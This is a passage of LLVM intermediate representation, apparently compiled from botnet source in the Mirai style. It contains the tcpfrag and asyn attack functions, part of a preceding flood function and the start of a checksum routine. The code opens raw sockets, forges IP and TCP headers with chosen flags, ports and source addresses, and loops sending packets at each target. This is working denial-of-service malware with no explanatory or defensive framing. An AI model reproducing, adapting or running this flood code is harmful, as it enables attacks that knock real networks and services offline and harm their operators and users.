; <label>:159:                                    ; preds = %156, %155
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %131, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %131, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %171, label %168

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %131, i64 38
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  br label %171

; <label>:171:                                    ; preds = %167, %168
  %172 = getelementptr inbounds i8, i8* %131, i64 10
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = bitcast i8* %131 to i16*
  %175 = call zeroext i16 @checksum_generic(i16* %174, i32 20)
  store i16 %175, i16* %173, align 2
  %176 = getelementptr inbounds i8, i8* %131, i64 36
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 4
  %178 = call zeroext i16 @htons(i16 zeroext 40) #11
  %179 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %132, i8* %133, i16 zeroext %178, i32 40)
  store i16 %179, i16* %177, align 4
  %180 = getelementptr inbounds i8, i8* %131, i64 22
  %181 = bitcast i8* %180 to i16*
  %182 = load i16, i16* %181, align 2
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0, i32 1
  store i16 %182, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %37, i8* %131, i64 60, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %43
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpfrag(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %190, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = zext i8 %0 to i64
  %65 = or i16 %63, 160
  br label %79

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %190

..preheader_crit_edge:                            ; preds = %96
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i32 %36, -1
  %70 = and i32 %11, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %17, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %19, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = icmp eq i32 %21, 65535
  %77 = icmp eq i32 %22, 65535
  %78 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:79:                                     ; preds = %.lr.ph130, %96
  %indvars.iv = phi i64 [ 0, %.lr.ph130 ], [ %indvars.iv.next, %96 ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %80, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 20
  %83 = getelementptr inbounds i8, i8* %80, i64 40
  store i8 69, i8* %80, align 4
  %84 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #11
  %86 = getelementptr inbounds i8, i8* %80, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #11
  %89 = getelementptr inbounds i8, i8* %80, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %79
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %94 = getelementptr inbounds i8, i8* %80, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %79, %92
  %97 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %80, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %80, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #11
  %105 = bitcast i8* %82 to i16*
  store i16 %104, i16* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %20) #11
  %107 = getelementptr inbounds i8, i8* %80, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %46) #11
  %110 = zext i16 %109 to i32
  %111 = getelementptr inbounds i8, i8* %80, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %110, i32* %112, align 4
  %113 = getelementptr inbounds i8, i8* %80, i64 32
  %114 = bitcast i8* %113 to i16*
  store i16 %65, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %80, i64 41
  store i8 2, i8* %83, align 1
  %116 = getelementptr inbounds i8, i8* %80, i64 42
  store i8 4, i8* %115, align 1
  %117 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %118 = bitcast i8* %116 to i16*
  store i16 %117, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %80, i64 44
  %120 = getelementptr inbounds i8, i8* %80, i64 45
  store i8 4, i8* %119, align 1
  %121 = getelementptr inbounds i8, i8* %80, i64 46
  store i8 2, i8* %120, align 1
  %122 = getelementptr inbounds i8, i8* %80, i64 47
  store i8 8, i8* %121, align 1
  store i8 10, i8* %122, align 1
  %123 = getelementptr inbounds i8, i8* %80, i64 56
  %124 = getelementptr inbounds i8, i8* %80, i64 57
  store i8 1, i8* %123, align 1
  %125 = getelementptr inbounds i8, i8* %80, i64 58
  store i8 3, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %80, i64 59
  store i8 3, i8* %125, align 1
  store i8 6, i8* %126, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %127 = icmp slt i64 %indvars.iv.next, %64
  br i1 %127, label %79, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %171
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %171
  %128 = phi i32 [ %188, %171 ], [ 0, %.lr.ph.preheader ]
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %8, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %131, i64 20
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %131, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %69, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %131, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %71, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %131, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %73, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %133 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %75, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %131, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %131, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %171, label %168

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %131, i64 38
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  br label %171

; <label>:171:                                    ; preds = %167, %168
  %172 = getelementptr inbounds i8, i8* %131, i64 10
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = bitcast i8* %131 to i16*
  %175 = call zeroext i16 @checksum_generic(i16* %174, i32 20)
  store i16 %175, i16* %173, align 2
  %176 = getelementptr inbounds i8, i8* %131, i64 36
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 4
  %178 = call zeroext i16 @htons(i16 zeroext 40) #11
  %179 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %132, i8* %133, i16 zeroext %178, i32 40)
  store i16 %179, i16* %177, align 4
  %180 = getelementptr inbounds i8, i8* %131, i64 22
  %181 = bitcast i8* %180 to i16*
  %182 = load i16, i16* %181, align 2
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0, i32 1
  store i16 %182, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %37, i8* %131, i64 60, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %43
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_asyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %190, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = zext i8 %0 to i64
  %65 = or i16 %63, 160
  br label %79

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %190

..preheader_crit_edge:                            ; preds = %96
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i32 %36, -1
  %70 = and i32 %11, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %17, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %19, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = icmp eq i32 %21, 65535
  %77 = icmp eq i32 %22, 65535
  %78 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:79:                                     ; preds = %.lr.ph130, %96
  %indvars.iv = phi i64 [ 0, %.lr.ph130 ], [ %indvars.iv.next, %96 ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %80, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 20
  %83 = getelementptr inbounds i8, i8* %80, i64 40
  store i8 69, i8* %80, align 4
  %84 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #11
  %86 = getelementptr inbounds i8, i8* %80, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #11
  %89 = getelementptr inbounds i8, i8* %80, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %79
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %94 = getelementptr inbounds i8, i8* %80, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %79, %92
  %97 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %80, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %80, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #11
  %105 = bitcast i8* %82 to i16*
  store i16 %104, i16* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %20) #11
  %107 = getelementptr inbounds i8, i8* %80, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %46) #11
  %110 = zext i16 %109 to i32
  %111 = getelementptr inbounds i8, i8* %80, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %110, i32* %112, align 4
  %113 = getelementptr inbounds i8, i8* %80, i64 32
  %114 = bitcast i8* %113 to i16*
  store i16 %65, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %80, i64 41
  store i8 2, i8* %83, align 1
  %116 = getelementptr inbounds i8, i8* %80, i64 42
  store i8 4, i8* %115, align 1
  %117 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %118 = bitcast i8* %116 to i16*
  store i16 %117, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %80, i64 44
  %120 = getelementptr inbounds i8, i8* %80, i64 45
  store i8 4, i8* %119, align 1
  %121 = getelementptr inbounds i8, i8* %80, i64 46
  store i8 2, i8* %120, align 1
  %122 = getelementptr inbounds i8, i8* %80, i64 47
  store i8 8, i8* %121, align 1
  store i8 10, i8* %122, align 1
  %123 = getelementptr inbounds i8, i8* %80, i64 56
  %124 = getelementptr inbounds i8, i8* %80, i64 57
  store i8 1, i8* %123, align 1
  %125 = getelementptr inbounds i8, i8* %80, i64 58
  store i8 3, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %80, i64 59
  store i8 3, i8* %125, align 1
  store i8 6, i8* %126, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %127 = icmp slt i64 %indvars.iv.next, %64
  br i1 %127, label %79, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %171
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %171
  %128 = phi i32 [ %188, %171 ], [ 0, %.lr.ph.preheader ]
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %8, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %131, i64 20
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %131, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %69, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %131, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %71, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %131, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %73, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %133 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %75, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %131, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %131, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %171, label %168

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %131, i64 38
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  br label %171

; <label>:171:                                    ; preds = %167, %168
  %172 = getelementptr inbounds i8, i8* %131, i64 10
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = bitcast i8* %131 to i16*
  %175 = call zeroext i16 @checksum_generic(i16* %174, i32 20)
  store i16 %175, i16* %173, align 2
  %176 = getelementptr inbounds i8, i8* %131, i64 36
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 4
  %178 = call zeroext i16 @htons(i16 zeroext 40) #11
  %179 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %132, i8* %133, i16 zeroext %178, i32 40)
  store i16 %179, i16* %177, align 4
  %180 = getelementptr inbounds i8, i8* %131, i64 22
  %181 = bitcast i8* %180 to i16*
  %182 = load i16, i16* %181, align 2
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0, i32 1
  store i16 %182, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %37, i8* %131, i64 60, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %43
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
